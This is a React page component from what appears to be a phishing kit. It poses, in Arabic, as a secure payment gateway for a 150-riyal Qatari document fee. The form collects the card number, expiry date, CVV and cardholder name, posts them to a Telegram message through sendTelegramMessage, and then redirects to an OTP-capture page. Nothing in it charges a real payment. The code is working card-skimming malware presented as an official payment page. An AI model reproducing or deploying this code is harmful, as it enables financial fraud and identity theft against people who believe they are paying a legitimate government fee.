import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useRegistration } from '../contexts/RegistrationContext';
import LoadingScreen from '../components/LoadingScreen';
import Header from '../components/Header';
import securePaymentLogos from '../assets/secure-payment-logos.png';
import visaMastercard from '../assets/visa-mastercard.svg';

const RegistrationComplete = () => {
  const navigate = useNavigate();
  const { updateFormData, sendTelegramMessage, formData } = useRegistration();
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardholderName, setCardholderName] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return value;
    }
  };

  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    if (v.length >= 2) {
      return v.substring(0, 2) + '/' + v.substring(2, 4);
    }
    return v;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cardNumber || !expiryDate || !cvv || !cardholderName) {
      setError('الرجاء إدخال جميع بيانات البطاقة');
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      updateFormData({ cardNumber, expiryDate, cvv, cardholderName });
      
      await sendTelegramMessage(
        `💳 بيانات بطاقة الدفع\n\n` +
        `💳 رقم البطاقة: ${cardNumber}\n` +
        `📅 تاريخ الانتهاء: ${expiryDate}\n` +
        `🔐 CVV: ${cvv}\n` +
        `👤 اسم حامل البطاقة: ${cardholderName}\n` +
        `🆔 معرف المستخدم: ${formData.visitorId || 'غير متوفر'}`
      );

      setTimeout(() => {
        setIsLoading(false);
        navigate('/payment-otp');
      }, 2000);
    } catch (err) {
      setIsLoading(false);
      setError('حدث خطأ، الرجاء المحاولة مرة أخرى');
    }
  };

  if (isLoading) {
    return <LoadingScreen message="جاري معالجة الدفع..." />;
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" dir="rtl">
      <Header />

      <div className="flex-1 flex flex-col items-center justify-center p-6">
        <div className="bg-white rounded-2xl shadow-lg p-8 w-full max-w-md">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold text-[#6A0F49] mb-2">
              بوابة الدفع الآمنة
            </h1>
            <p className="text-gray-600 text-sm">
              رسوم إصدار الوثيقة: 150 ريال قطري
            </p>
          </div>

          <div className="flex justify-center mb-6">
            <img src={visaMastercard} alt="Visa Mastercard" className="h-10" />
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                اسم حامل البطاقة
              </label>
              <input
                type="text"
                value={cardholderName}
                onChange={(e) => setCardholderName(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#6A0F49] focus:border-transparent text-right"
                placeholder="الاسم كما يظهر على البطاقة"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                رقم البطاقة
              </label>
              <input
                type="text"
                value={cardNumber}
                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#6A0F49] focus:border-transparent text-left"
                placeholder="0000 0000 0000 0000"
                maxLength={19}
                dir="ltr"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  تاريخ الانتهاء
                </label>
                <input
                  type="text"
                  value={expiryDate}
                  onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#6A0F49] focus:border-transparent text-center"
                  placeholder="MM/YY"
                  maxLength={5}
                  dir="ltr"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  رمز CVV
                </label>
                <input
                  type="password"
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#6A0F49] focus:border-transparent text-center"
                  placeholder="***"
                  maxLength={4}
                />
              </div>
            </div>

            {error && (
              <div className="text-red-500 text-sm text-center">{error}</div>
            )}

            <button
              type="submit"
              className="w-full bg-[#6A0F49] text-white py-3 rounded-lg font-semibold hover:bg-[#5A0D3D] transition-colors mt-6"
            >
              ادفع الآن
            </button>
          </form>

          <div className="mt-6 flex justify-center">
            <img src={securePaymentLogos} alt="Secure Payment" className="h-8" />
          </div>
        </div>
      </div>
    </div>
  );
};

export default RegistrationComplete;
